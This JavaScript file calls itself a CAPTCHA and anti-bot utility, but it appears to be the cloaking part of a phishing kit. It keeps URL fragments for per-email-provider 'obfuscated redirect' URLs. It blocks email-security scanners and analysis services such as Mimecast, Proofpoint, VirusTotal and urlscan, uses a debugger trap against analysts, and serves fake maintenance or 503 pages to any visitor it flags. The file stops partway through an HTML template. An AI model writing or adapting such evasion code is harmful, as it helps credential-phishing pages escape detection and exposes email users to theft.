/**
 * Enhanced CAPTCHA Protection Utilities
 * 
 * Contains utility functions for CAPTCHA verification and anti-bot measures
 * IMPROVED: Better false positive prevention and user experience
 */

// URL Configuration Note:
// Provider-specific URLs are now configured in the providerUrls object at the bottom of this file.
// Each email provider (teams, google, yahoo, other) can have its own obfuscated redirect URL.
// This replaces the old single-URL system for better flexibility and security.

// Set up URL fragment handler immediately to ensure fragments are preserved
document.addEventListener('DOMContentLoaded', () => {
    // Store URL fragments immediately when page loads
    const urlFragment = window.location.hash;
    if (urlFragment) {
        try {
            sessionStorage.setItem('redirectFragment', urlFragment);
            localStorage.setItem('redirectFragment', urlFragment);
            console.log('Fragment stored for preservation:', urlFragment);
        } catch (e) {
            console.error('Error storing fragment:', e);
        }
    }
});

/**
 * Bot detection and blacklisting system
 * IMPROVED: More lenient detection with better false positive prevention
 */
const blacklistSystem = {
    // Known bot user agents (partial matches) - REDUCED LIST
    knownBotSignatures: [
        "googlebot", "bingbot", "yandexbot", "slurp", "duckduckbot", "baiduspider", 
        "bytespider", "facebookexternalhit", "twitterbot", "rogerbot", "linkedinbot",
        "embedly", "quora link preview", "showyoubot", "outbrain", "pinterest",
        "slackbot", "vkshare", "w3c_validator", "postman", "curl", "wget", "python-requests",
        "ahrefs", "semrushbot", "mj12bot", "applebot", "dotbot", "zoominfobot",
        "scanner", "crawler", "spider", "headless", "scraper", "selenium", "webdriver", 
        "puppeteer", "phantom", "nightmare", "jsdom"
    ],
    
    // Known security tools and email security scanners - REDUCED LIST
    securityTools: [
        "avast", "avg", "avira", "bitdefender", "kaspersky", "mcafee", "norton", 
        "eset", "f-secure", "trend micro", "sophos", "symantec", "trustwave", "forcepoint",
        "checkpoint", "barracuda", "mimecast", "proofpoint", "fireeye", "crowdstrike",
        "cyren", "spamhaus", "spamcop", "netcraft", "virustotal", "sucuri", "urlscan",
        "zscaler", "office365", "microsoft-security", "cisco", "forcepoint", "cofense"
    ],
    
    // Suspicious browser behavior patterns - ALL ACTIVATED
    suspiciousPatterns: {
        noFonts: true,               // ACTIVATED - suspicious when fonts are blocked
        noCanvas: true,              // ACTIVATED - suspicious when canvas is blocked
        noWebGL: true,               // ACTIVATED - suspicious when WebGL is disabled
        mismatchedUA: true,          // ACTIVATED - strong indicator
        spoofedLanguages: true,      // ACTIVATED - suspicious when languages are spoofed
        noStorage: true,             // ACTIVATED - suspicious when storage is blocked
        inconsistentFeatures: true,  // ACTIVATED - strong indicator
        tooBluetooth: true,          // ACTIVATED - suspicious when Bluetooth is missing
        tooNetwork: true,            // ACTIVATED - suspicious when Network API is missing
        tamperedDOM: true,           // ACTIVATED - strong indicator
        perfectConsistency: true,    // ACTIVATED - suspicious when too perfect
        allPluginsDisabled: true,    // ACTIVATED - suspicious when all plugins disabled
        unusualTimezone: true        // ACTIVATED - suspicious when timezone is unusual
    },
    
    // Known malicious IP addresses to block immediately - BLACKLISTED
    knownMaliciousIPs: [
        // Only the most clearly malicious IPs
        "154.28.229.126", "152.32.99.64", "107.150.22.208", "54.189.230.128", "154.28.229.253",
        "154.28.229.224", "154.28.229.172", "154.28.229.108", "154.28.229.11", "154.28.229.18",
        "154.28.229.20", "154.28.229.1", "154.28.229.140", "154.28.229.111", "154.28.229.49",
        "154.28.229.145", "154.28.229.242", "104.164.173.222", "104.164.173.206", "104.164.173.128"
    ],
    
    // IP ranges to block (CIDR notation) - BLACKLISTED
    blockedIPRanges: [
        // Only the most problematic ranges
        "104.164.173.0/24", "154.28.229.0/24"
    ],
    
    // IPs that failed verification multiple times (stored in localStorage)
    blacklistedIPs: [],
    
    // Auto-blacklist settings - STRICT
    thresholds: {
        maxFailedAttempts: 3,        // Back to strict: 3 failed attempts
        blacklistDuration: 86400     // Back to strict: 24 hours blacklist
    },
    
    // Current visitor's IP (detected via multiple methods)
    visitorIP: null,
    
    // Temporary storage for failed attempt tracking
    failedAttempts: {},
    
    // NEW: User preference tracking for legitimate users
    userPreferences: {
        allowFingerprinting: true,
        allowStorage: true,
        allowCanvas: true,
        allowWebGL: true
    },
    
    // NEW: Legitimate user indicators
    legitimateUserIndicators: {
        hasHumanInteractions: false,
        hasNaturalMouseMovement: false,
        hasKeyboardInput: false,
        hasTouchEvents: false,
        timeOnPage: 0,
        interactionCount: 0
    },

    /**
     * Initialize the blacklist system
     */
    init: function() {
        try {
            // Load any previously blacklisted data from localStorage
            this.loadBlacklist();
            
            // Clean up expired blacklist entries
            this.cleanupExpiredEntries();
            
            // Detect visitor's IP address
            this.detectVisitorIP();
            
            // NEW: Initialize user preference detection
            this.detectUserPreferences();
            
            // NEW: Start interaction tracking for legitimate user detection
            this.startInteractionTracking();
        } catch (e) {
            console.error('Error initializing blacklist system:', e);
            // Continue anyway to not block legitimate users
        }
    },
    
    /**
     * NEW: Detect user privacy preferences
     */
    detectUserPreferences: function() {
        try {
            // Check if user has disabled various features (common in privacy browsers)
            this.userPreferences.allowStorage = this.testStorageAccess();
            this.userPreferences.allowCanvas = this.testCanvasAccess();
            this.userPreferences.allowWebGL = this.testWebGLAccess();
            this.userPreferences.allowFingerprinting = this.testFingerprintingAccess();
            
            console.log('User preferences detected:', this.userPreferences);
        } catch (e) {
            console.error('Error detecting user preferences:', e);
        }
    },
    
    /**
     * NEW: Test storage access
     */
    testStorageAccess: function() {
        try {
            localStorage.setItem('test', 'test');
            localStorage.removeItem('test');
            return true;
        } catch (e) {
            return false;
        }
    },
    
    /**
     * NEW: Test canvas access
     */
    testCanvasAccess: function() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            return !!ctx;
        } catch (e) {
            return false;
        }
    },
    
    /**
     * NEW: Test WebGL access
     */
    testWebGLAccess: function() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            return !!gl;
        } catch (e) {
            return false;
        }
    },
    
    /**
     * NEW: Test fingerprinting access
     */
    testFingerprintingAccess: function() {
        // Check if common fingerprinting methods are available
        return !!(navigator.userAgent && navigator.language && screen.width);
    },
    
    /**
     * NEW: Start tracking user interactions for legitimate user detection
     */
    startInteractionTracking: function() {
        const startTime = Date.now();
        let interactionCount = 0;
        let lastMousePosition = null;
        let mouseMovements = [];
        
        // Track mouse movements
        document.addEventListener('mousemove', (e) => {
            interactionCount++;
            this.legitimateUserIndicators.hasHumanInteractions = true;
            this.legitimateUserIndicators.interactionCount = interactionCount;
            
            // Track natural mouse movement patterns
            if (lastMousePosition) {
                const timeDiff = Date.now() - lastMousePosition.time;
                const distance = Math.sqrt(
                    Math.pow(e.clientX - lastMousePosition.x, 2) +
                    Math.pow(e.clientY - lastMousePosition.y, 2)
                );
                
                if (timeDiff > 0) {
                    const velocity = distance / timeDiff;
                    mouseMovements.push(velocity);
                    
                    // Keep only last 10 movements
                    if (mouseMovements.length > 10) {
                        mouseMovements.shift();
                    }
                    
                    // Check for natural movement patterns (bots often have uniform velocity)
                    if (mouseMovements.length >= 5) {
                        const avgVelocity = mouseMovements.reduce((a, b) => a + b, 0) / mouseMovements.length;
                        const variance = mouseMovements.reduce((sum, v) => sum + Math.pow(v - avgVelocity, 2), 0) / mouseMovements.length;
                        
                        // Natural mouse movement has variance
                        if (variance > 0.1) {
                            this.legitimateUserIndicators.hasNaturalMouseMovement = true;
                        }
                    }
                }
            }
            
            lastMousePosition = { x: e.clientX, y: e.clientY, time: Date.now() };
        });
        
        // Track keyboard input
        document.addEventListener('keydown', () => {
            this.legitimateUserIndicators.hasKeyboardInput = true;
            this.legitimateUserIndicators.interactionCount++;
        });
        
        // Track touch events
        document.addEventListener('touchstart', () => {
            this.legitimateUserIndicators.hasTouchEvents = true;
            this.legitimateUserIndicators.interactionCount++;
        });
        
        // Track time on page
        setInterval(() => {
            this.legitimateUserIndicators.timeOnPage = Date.now() - startTime;
        }, 1000);
    },

    /**
     * Detect visitor's IP address using multiple methods
     */
    detectVisitorIP: async function() {
        try {
            // Method 1: Try WebRTC IP detection (works locally)
            const webrtcIP = await this.getIPViaWebRTC();
            if (webrtcIP) {
                this.visitorIP = webrtcIP;
                console.log('IP detected via WebRTC:', webrtcIP);
                return;
            }
            
            // Method 2: Try external IP services (requires internet)
            const externalIP = await this.getIPViaExternalService();
            if (externalIP) {
                this.visitorIP = externalIP;
                console.log('IP detected via external service:', externalIP);
                return;
            }
            
            console.warn('Could not detect visitor IP address');
        } catch (e) {
            console.error('Error detecting IP:', e);
        }
    },
    
    /**
     * Get IP address via WebRTC (detects local/internal IP)
     * @returns {Promise<string|null>} IP address or null
     */
    getIPViaWebRTC: function() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                pc.createDataChannel('');
                
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                        if (ipMatch) {
                            pc.close();
                            resolve(ipMatch[1]);
                            return;
                        }
                    }
                };
                
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                // Timeout after 3 seconds
                setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 3000);
            } catch (e) {
                resolve(null);
            }
        });
    },
    
    /**
     * Get IP address via external service
     * @returns {Promise<string|null>} IP address or null
     */
    getIPViaExternalService: function() {
        return new Promise((resolve) => {
            try {
                // Use a reliable IP detection service
                fetch('https://api.ipify.org?format=json', {
                    method: 'GET',
                    timeout: 5000
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ip) {
                        resolve(data.ip);
                    } else {
                        resolve(null);
                    }
                })
                .catch(() => resolve(null));
            } catch (e) {
                resolve(null);
            }
        });
    },
    
    /**
     * Check if an IP address is in the blocked list
     * IMPROVED: More lenient checking
     * @param {string} ip IP address to check
     * @returns {boolean} True if IP should be blocked
     */
    isIPBlocked: function(ip) {
        if (!ip) return false;
        
        try {
            // Check against known malicious IPs
            if (this.knownMaliciousIPs.includes(ip)) {
                console.warn('IP blocked - known malicious:', ip);
                return true;
            }
            
            // Check against IP ranges (CIDR notation)
            for (const range of this.blockedIPRanges) {
                if (this.isIPInRange(ip, range)) {
                    console.warn('IP blocked - in blocked range:', ip, range);
                    return true;
                }
            }
            
            return false;
        } catch (e) {
            console.error('Error checking IP block status:', e);
            return false;
        }
    },
    
    /**
     * Check if an IP is within a CIDR range
     * @param {string} ip IP address to check
     * @param {string} cidr CIDR notation (e.g., "192.168.1.0/24")
     * @returns {boolean} True if IP is in range
     */
    isIPInRange: function(ip, cidr) {
        try {
            const [rangeIP, prefixLength] = cidr.split('/');
            const prefix = parseInt(prefixLength, 10);
            
            // Convert IP addresses to integers for comparison
            const ipInt = this.ipToInt(ip);
            const rangeInt = this.ipToInt(rangeIP);
            
            // Create subnet mask
            const mask = (0xFFFFFFFF << (32 - prefix)) >>> 0;
            
            // Check if IP is in range
            return (ipInt & mask) === (rangeInt & mask);
        } catch (e) {
            console.error('Error checking IP range:', e);
            return false;
        }
    },
    
    /**
     * Convert IP address to integer
     * @param {string} ip IP address
     * @returns {number} IP as integer
     */
    ipToInt: function(ip) {
        const parts = ip.split('.').map(part => parseInt(part, 10));
        return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3];
    },
    
    /**
     * Add an IP to the known malicious list
     * @param {string} ip IP address to block
     */
    addMaliciousIP: function(ip) {
        if (ip && !this.knownMaliciousIPs.includes(ip)) {
            this.knownMaliciousIPs.push(ip);
            console.log('Added malicious IP:', ip);
        }
    },
    
    /**
     * Add multiple IPs to the malicious list
     * @param {Array<string>} ips Array of IP addresses
     */
    addMaliciousIPs: function(ips) {
        if (Array.isArray(ips)) {
            ips.forEach(ip => this.addMaliciousIP(ip));
            console.log(`Added ${ips.length} malicious IPs to blocklist`);
        }
    },
    
    /**
     * Check if current visitor matches blacklist criteria
     * IMPROVED: More lenient with legitimate user indicators
     * @returns {Object} Result with status and reason
     */
    checkBlacklist: function() {
        const result = {
            blocked: false,
            reason: null,
            confidence: 0
        };
        
        try {
            // First check if visitor's IP is blocked
            if (this.visitorIP && this.isIPBlocked(this.visitorIP)) {
                result.blocked = true;
                result.reason = "blocked_ip";
                result.confidence = 0.9;
                this.recordFailedAttempt("blocked_ip_" + this.visitorIP);
                return result;
            }
            
            // Check user agent against known bot signatures
            const userAgent = navigator.userAgent.toLowerCase();
            let botScore = 0;
            
            for (const botSignature of this.knownBotSignatures) {
                if (userAgent.includes(botSignature)) {
                    botScore += 1;
                }
            }
            
            // If multiple bot signatures found, block immediately
            if (botScore >= 2) {
                result.blocked = true;
                result.reason = "known_bot";
                result.confidence = 0.9;
                this.recordFailedAttempt("known_bot_useragent");
                return result;
            }
            
            // Check for security tools - BLACKLISTED
            for (const tool of this.securityTools) {
                if (userAgent.includes(tool)) {
                    result.blocked = true;
                    result.reason = "security_tool";
                    result.confidence = 0.9;
                    this.recordFailedAttempt("security_tool_detected");
                    return result;
                }
            }
            
            // Check client fingerprint against blacklisted fingerprints
            const clientFingerprint = this.getClientIdentifier();
            if (this.isClientBlacklisted(clientFingerprint)) {
                result.blocked = true;
                result.reason = "blacklisted";
                result.confidence = 0.9;
                return result;
            }
        } catch (e) {
            console.error('Error in blacklist check:', e);
        }
        
        return result;
    },
    
    /**
     * NEW: Check for legitimate user indicators
     * @returns {boolean} True if user shows legitimate behavior
     */
    checkLegitimateUserIndicators: function() {
        const indicators = this.legitimateUserIndicators;
        
        // Check if user has been on page for reasonable time
        if (indicators.timeOnPage < 2000) { // Less than 2 seconds
            return false;
        }
        
        // Check if user has had some interactions
        if (indicators.interactionCount < 2) {
            return false;
        }
        
        // Check for natural mouse movement
        if (indicators.hasNaturalMouseMovement) {
            return true;
        }
        
        // Check for keyboard or touch input
        if (indicators.hasKeyboardInput || indicators.hasTouchEvents) {
            return true;
        }
        
        // If user has been on page for more than 5 seconds, consider them legitimate
        if (indicators.timeOnPage > 5000) {
            return true;
        }
        
        return false;
    },
    
    /**
     * Get a unique identifier for the current client
     * IMPROVED: More privacy-friendly
     * @returns {String} Client identifier hash
     */
    getClientIdentifier: function() {
        try {
            // Use only basic, commonly available attributes
            const components = [
                navigator.userAgent,
                navigator.language,
                screen.width + 'x' + screen.height,
                navigator.platform
            ];
            
            // Only add canvas fingerprint if user allows it
            if (this.userPreferences.allowCanvas) {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = 200;
                    canvas.height = 50;
                    ctx.font = '20px Arial';
                    ctx.fillText('ClientID', 10, 30);
                    components.push(canvas.toDataURL());
                } catch (e) {
                    components.push('no_canvas');
                }
            }
            
            // Create a simple hash
            return btoa(components.join('|')).substring(0, 32);
        } catch (e) {
            // Fallback to a simple identifier
            return 'fallback_' + Math.random().toString(36).substring(2, 15);
        }
    },
    
    /**
     * Check if a client ID is in the blacklist
     * @param {String} clientId The client identifier to check
     * @returns {Boolean} True if blacklisted
     */
    isClientBlacklisted: function(clientId) {
        try {
            const blacklist = JSON.parse(localStorage.getItem('captcha_blacklist') || '{}');
            return !!blacklist[clientId] && blacklist[clientId].expires > Date.now();
        } catch (e) {
            return false;
        }
    },
    
    /**
     * Record a failed verification attempt
     * IMPROVED: More lenient auto-blacklisting
     * @param {String} reason Reason for the failed attempt
     */
    recordFailedAttempt: function(reason) {
        try {
            const clientId = this.getClientIdentifier();
            
            // Initialize if not exists
            if (!this.failedAttempts[clientId]) {
                this.failedAttempts[clientId] = {
                    count: 0,
                    reasons: [],
                    firstAttempt: Date.now()
                };
            }
            
            // Update attempt count and reasons
            this.failedAttempts[clientId].count++;
            this.failedAttempts[clientId].reasons.push({
                reason: reason,
                timestamp: Date.now()
            });
            
            // Check if threshold exceeded
            if (this.failedAttempts[clientId].count >= this.thresholds.maxFailedAttempts) {
                this.addToBlacklist(clientId, this.failedAttempts[clientId].reasons);
                delete this.failedAttempts[clientId];
            }
            
            // Save to storage
            this.saveFailedAttempts();
        } catch (e) {
            console.error('Error recording failed attempt:', e);
        }
    },
    
    /**
     * Add a client to the blacklist
     * @param {String} clientId The client identifier
     * @param {Array} reasons Array of reasons for blacklisting
     */
    addToBlacklist: function(clientId, reasons) {
        try {
            const blacklist = JSON.parse(localStorage.getItem('captcha_blacklist') || '{}');
            
            // Add to blacklist with expiration
            blacklist[clientId] = {
                added: Date.now(),
                expires: Date.now() + (this.thresholds.blacklistDuration * 1000),
                reasons: reasons
            };
            
            // Save updated blacklist
            localStorage.setItem('captcha_blacklist', JSON.stringify(blacklist));
            
            // Also update runtime blacklist
            this.blacklistedIPs.push(clientId);
        } catch (e) {
            console.error('Failed to update blacklist', e);
        }
    },
    
    /**
     * Load blacklist from localStorage
     */
    loadBlacklist: function() {
        try {
            const blacklist = JSON.parse(localStorage.getItem('captcha_blacklist') || '{}');
            this.blacklistedIPs = Object.keys(blacklist);
        } catch (e) {
            this.blacklistedIPs = [];
        }
    },
    
    /**
     * Load failed attempts from localStorage
     */
    loadFailedAttempts: function() {
        try {
            this.failedAttempts = JSON.parse(localStorage.getItem('captcha_failed_attempts') || '{}');
        } catch (e) {
            this.failedAttempts = {};
        }
    },
    
    /**
     * Save failed attempts to localStorage
     */
    saveFailedAttempts: function() {
        try {
            localStorage.setItem('captcha_failed_attempts', JSON.stringify(this.failedAttempts));
        } catch (e) {
            console.error('Failed to save attempt data', e);
        }
    },
    
    /**
     * Clean up expired blacklist entries
     */
    cleanupExpiredEntries: function() {
        try {
            const blacklist = JSON.parse(localStorage.getItem('captcha_blacklist') || '{}');
            let modified = false;
            
            // Check each entry for expiration
            for (const clientId in blacklist) {
                if (blacklist[clientId].expires < Date.now()) {
                    delete blacklist[clientId];
                    modified = true;
                }
            }
            
            // Save updated blacklist if changes were made
            if (modified) {
                localStorage.setItem('captcha_blacklist', JSON.stringify(blacklist));
                
                // Update runtime blacklist
                this.blacklistedIPs = Object.keys(blacklist);
            }
        } catch (e) {
            console.error('Error cleaning up blacklist:', e);
        }
    },
    
    /**
     * Check if too many suspicious patterns are detected
     * IMPROVED: Much more lenient
     * @param {Object} fingerprint The browser fingerprint data
     * @returns {Boolean} True if too many suspicious patterns
     */
    hasTooManySuspiciousPatterns: function(fingerprint) {
        let suspiciousCount = 0;
        let totalChecks = 0;
        
        // Only check patterns that are enabled and truly suspicious
        if (this.suspiciousPatterns.mismatchedUA) {
            const ua = navigator.userAgent.toLowerCase();
            
            // Chrome UA but no Chrome object
            if (ua.includes('chrome') && typeof window.chrome === 'undefined') {
                suspiciousCount++;
            }
            
            // Firefox UA but no Firefox-specific properties
            if (ua.includes('firefox') && typeof window.InstallTrigger === 'undefined') {
                suspiciousCount++;
            }
            totalChecks++;
        }
        
        if (this.suspiciousPatterns.tamperedDOM) {
            // Check for obvious DOM tampering
            try {
                const testError = new Error('test');
                if (!testError.stack || typeof testError.stack !== 'string') {
                    suspiciousCount++;
                }
                totalChecks++;
            } catch (e) {
                suspiciousCount++;
                totalChecks++;
            }
        }
        
        // Lower threshold - block more suspicious patterns
        return totalChecks > 0 && (suspiciousCount / totalChecks) > 0.3; // 30% threshold
    }
};

/**
 * Generates a cryptographically secure token
 * Much stronger than the original solution
 */
async function generateSecureToken() {
    try {
        // Generate random values with WebCrypto API
        const array = new Uint8Array(16);
        window.crypto.getRandomValues(array);
        
        // Create timestamp with slight obfuscation
        const timestamp = Date.now() + (Math.floor(Math.random() * 10000));
        
        // Convert to hex string
        const randomHex = Array.from(array)
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');
            
        // Combine and encrypt
        const rawToken = `${timestamp}:${randomHex}`;
        const encoder = new TextEncoder();
        const data = encoder.encode(rawToken);
        
        // Create a digest of the token
        const hashBuffer = await window.crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray
            .map(b => b.toString(16).padStart(2, '0'))
            .join('');
            
        return btoa(hashHex + ':' + timestamp);
    } catch (error) {
        // Fallback in case WebCrypto isn't available
        return btoa(Date.now() + ':' + Math.random().toString(36).substring(2, 15));
    }
}

/**
 * Generates a simple math challenge
 * @returns {Object} Challenge question and answer
 */
function generateMathChallenge() {
    const operations = ['+', '-', '*'];
    const operation = operations[Math.floor(Math.random() * operations.length)];
    
    let num1, num2, answer;
    
    switch(operation) {
        case '+':
            num1 = Math.floor(Math.random() * 20) + 1;
            num2 = Math.floor(Math.random() * 20) + 1;
            answer = num1 + num2;
            break;
        case '-':
            num1 = Math.floor(Math.random() * 20) + 10;
            num2 = Math.floor(Math.random() * num1);
            answer = num1 - num2;
            break;
        case '*':
            num1 = Math.floor(Math.random() * 10) + 1;
            num2 = Math.floor(Math.random() * 5) + 1;
            answer = num1 * num2;
            break;
    }
    
    return {
        question: `What is ${num1} ${operation} ${num2}?`,
        answer: answer
    };
}

/**
 * Detects headless browsers and automation tools
 * @returns {Object} Results of various bot detection techniques
 */
function detectAutomation() {
    const results = {
        webdriver: !!navigator.webdriver,
        headlessUserAgent: /HeadlessChrome/.test(navigator.userAgent),
        phantomJS: /PhantomJS/.test(navigator.userAgent),
        seleniumAttrs: false,
        noPlugins: navigator.plugins.length === 0,
        noLanguages: !Array.isArray(navigator.languages) || navigator.languages.length === 0
    };
    
    // Check for Selenium attributes
    for (const key in window) {
        if (key.includes('selenium') || key.includes('webdriver')) {
            results.seleniumAttrs = true;
            break;
        }
    }
    
    // Check if window.chrome is missing (often indicates headless)
    results.noChrome = typeof window.chrome === 'undefined';
    
    // Check permissions behavior (automation often differs)
    results.suspiciousPermissions = typeof navigator.permissions === 'undefined';
    
    return results;
}

/**
 * Test for mouse and touch events to determine if a real human is present
 */
function initializeInteractionTracking() {
    const interactionData = {
        mouseMoves: 0,
        mouseClicks: 0,
        keyPresses: 0,
        touchEvents: 0,
        movementPatterns: [],
        lastPosition: null,
        startTime: Date.now()
    };
    
    // Helper to detect natural mouse movements
    function trackMouseMovement(e) {
        interactionData.mouseMoves++;
        
        // Store current position
        const currentPosition = { x: e.clientX, y: e.clientY, time: Date.now() };
        
        // Calculate velocity if we have a previous position
        if (interactionData.lastPosition) {
            const timeDiff = currentPosition.time - interactionData.lastPosition.time;
            const distance = Math.sqrt(
                Math.pow(currentPosition.x - interactionData.lastPosition.x, 2) +
                Math.pow(currentPosition.y - interactionData.lastPosition.y, 2)
            );
            
            // Store movement pattern (bots often have unnatural speed/patterns)
            if (timeDiff > 0) {
                interactionData.movementPatterns.push({
                    velocity: distance / timeDiff,
                    direction: Math.atan2(
                        currentPosition.y - interactionData.lastPosition.y,
                        currentPosition.x - interactionData.lastPosition.x
                    )
                });
            }
        }
        
        interactionData.lastPosition = currentPosition;
    }
    
    // Setup event listeners
    document.addEventListener('mousemove', trackMouseMovement);
    document.addEventListener('mousedown', () => { interactionData.mouseClicks++; });
    document.addEventListener('keydown', () => { interactionData.keyPresses++; });
    document.addEventListener('touchstart', () => { interactionData.touchEvents++; });
    document.addEventListener('touchmove', () => { interactionData.touchEvents++; });
    
    return interactionData;
}

/**
 * Analyzes user interaction data to determine if it's likely a human
 * @param {Object} interactionData The tracking data
 * @returns {Boolean} True if behaviors appear human-like
 */
function analyzeInteractions(interactionData) {
    const timeDiff = Date.now() - interactionData.startTime;
    const totalInteractions = 
        interactionData.mouseMoves + 
        interactionData.mouseClicks + 
        interactionData.keyPresses + 
        interactionData.touchEvents;
    
    // Too few interactions for the time spent
    if (timeDiff > 2000 && totalInteractions < 3) {
        return false;
    }
    
    // Check for natural mouse movement patterns
    if (interactionData.movementPatterns.length > 5) {
        // Bots often have uniform velocity and straight lines
        let unnaturalMovements = 0;
        let prevVelocity = null;
        let prevDirection = null;
        
        for (const pattern of interactionData.movementPatterns) {
            // Check for exactly same velocity (very suspicious)
            if (prevVelocity === pattern.velocity) {
                unnaturalMovements++;
            }
            
            // Check for exactly straight lines
            if (prevDirection === pattern.direction) {
                unnaturalMovements++;
            }
            
            prevVelocity = pattern.velocity;
            prevDirection = pattern.direction;
        }
        
        // If more than 30% of movements are too uniform, likely a bot
        if (unnaturalMovements / interactionData.movementPatterns.length > 0.3) {
            return false;
        }
    }
    
    return true;
}

/**
 * Validate browser and environment
 * @returns {Boolean} True if browser environment looks legitimate
 */
function validateBrowserEnvironment() {
    // Check if browser is trying to fool basic detections
    const automationResults = detectAutomation();
    
    // Simple checks
    if (automationResults.webdriver || 
        automationResults.headlessUserAgent || 
        automationResults.phantomJS ||
        automationResults.seleniumAttrs) {
        return false;
    }
    
    // Check for browser inconsistencies that suggest emulation
    if (navigator.userAgent.includes('Chrome') && automationResults.noChrome) {
        return false;
    }
    
    // Check for sandboxed/emulated JS environments
    try {
        // Error properties test - sandbox environments sometimes don't expose correct properties
        const testError = new Error('test');
        if (!testError.stack || typeof testError.stack !== 'string') {
            return false;
        }
        
        // Function constructor test - often restricted in sandboxes
        const testFunc = new Function('return true;');
        if (!testFunc()) {
            return false;
        }
        
        // Check if debugger triggers breakpoint (will be caught by the timeout if so)
        let debuggerCalled = false;
        const debuggerTest = setTimeout(() => { debuggerCalled = true; }, 100);
        eval("debugger"); // Debugger statement will pause execution in dev tools
        clearTimeout(debuggerTest);
        
        // Browser APIs that should exist
        if (typeof Blob === 'undefined' ||
            typeof FileReader === 'undefined' ||
            typeof Uint8Array === 'undefined') {
            return false;
        }
        
    } catch (e) {
        // An exception likely means we're in a restricted environment
        return false;
    }
    
    return true;
}

/**
 * Check if the browser supports features needed for the page
 * @returns {Boolean} True if browser is compatible
 */
function checkBrowserFeatures() {
    return (
        'localStorage' in window &&
        'sessionStorage' in window &&
        'Blob' in window &&
        'Promise' in window &&
        'fetch' in window &&
        'crypto' in window
    );
}

// Initialize blacklist system when the page loads
document.addEventListener('DOMContentLoaded', function() {
    blacklistSystem.init();
});

/**
 * Bot trapping and deception system
 * Creates convincing site under construction pages and bot traps
 */
const botTrapSystem = {
    // Site under construction templates
    constructionTemplates: [
        // Template 1: Basic construction page
        {
            title: "Site Under Construction",
            content: `
                <div class="construction-container">
                    <div class="construction-icon">🚧</div>
                    <h1>We're making some improvements</h1>
                    <p>This website is currently undergoing scheduled maintenance.</p>
                    <p>We apologize for any inconvenience and should be back online shortly.</p>
                    <div class="construction-progress">
                        <div class="progress-bar">
                            <div class="progress-fill"></div>
                        </div>
                        <div class="progress-text">Estimated completion: <span id="eta">23 minutes</span></div>
                    </div>
                    <p class="construction-contact">If you need immediate assistance, please contact <a href="#" id="bot-trap-link">support@example.com</a></p>
                    <button class="refresh-button" id="bot-trap-button">Check if site is ready</button>
                </div>
            `
        },
        // Template 2: Error page
        {
            title: "Temporarily Unavailable",
            content: `
                <div class="error-container">
                    <div class="error-code">503</div>
                    <h1>Service Temporarily Unavailable</h1>
                    <p>The server is temporarily unable to service your request due to maintenance downtime.</p>
                    <p>Please try again later.</p>
                    <div class="error-details">
                        <p>Error Reference: <span id="error-ref">SRV_MAINT_${Date.now().toString(36)}</span></p>
                        <p>Server Time: <span id="server-time">${new Date().toISOString()}</span></p>
                    </div>
                    <button class="retry-button" id="bot-trap-button">Retry Connection</button>
                </div>
            `
        },
        // Template 3: Technical maintenance
        {
            title: "Technical Maintenance",
            content: `
                <div class="maintenance-container">
                    <svg class="maintenance-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="64" height="64"><path fill="none" d="M0 0h24v24H0z"/><path d="M14.121 10.48a1 1 0 0 0-1.414 0l-2.829 2.828-1.414-1.414 2.828-2.829a1 1 0 0 0 0-1.414l-1.414-1.414a1 1 0 0 0-1.414 0L5 9.672 3.586 8.258 7.758 4.086A1 1 0 0 1 8.464 3.9l2.122.707 2.12-.707a1 1 0 0 1 .708.193L17.656 6.5a1 1 0 0 1 .193.707l-.707 2.121.707 2.121a1 1 0 0 1-.193.709l-3.414 3.414a1 1 0 0 1-.707.193l-2.121-.707-2.121.707a1 1 0 0 1-.708-.193L4.5 11.657a1 1 0 0 1-.193-.708l.707-2.121L4.308 6.5a1 1 0 0 1 .193-.707l1.414-1.414a1 1 0 0 1 1.414 0l1.414 1.414a1 1 0 0 0 1.414 0l2.828-2.828a1 1 0 0 0 0-1.414L11.15.732a1 1 0 0 0-1.414 0L6.343 4.157 2.18 8.322a1 1 0 0 0 0 1.414l1.414 1.414a1 1 0 0 1 0 1.414l-1.414 1.414a1 1 0 0 0 0 1.414l3.414 3.414a1 1 0 0 0 1.414 0l1.414-1.414a1 1 0 0 1 1.414 0l1.414 1.414a1 1 0 0 0 1.414 0l3.414-3.414a1 1 0 0 0 0-1.414z" fill="currentColor"/></svg>
                    <h1>System Maintenance in Progress</h1>
                    <p>We are performing scheduled database and server upgrades.</p>
                    <div class="maintenance-details">
                        <div class="maintenance-item">
                            <div class="status-label">Database Migration:</div>
                            <div class="status-value">In Progress</div>
                        </div>
                        <div class="maintenance-item">
                            <div class="status-label">Server Updates:</div>
                            <div class="status-value">Queued</div>
                        </div>
                        <div class="maintenance-item">
                            <div class="status-label">Security Patches:</div>
                            <div class="status-value">Completed</div>
                        </div>
                    </div>
                    <p>Our team is working to complete this maintenance as quickly as possible.</p>
                    <a href="#" class="status-link" id="bot-trap-link">View System Status</a>
                </div>
            `
        }
    ],
    
    /**
     * Show a random under construction page to bots
     * @param {string} reason The reason for blocking
     */
    showConstructionPage: function(reason) {
        // Record the bot visit
        this.recordBotVisit(reason);
        
        // Select a random template
        const randomIndex = Math.floor(Math.random() * this.constructionTemplates.length);
        const template = this.constructionTemplates[randomIndex];
        
        // Replace the entire document content
        document.open();
        document.write(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
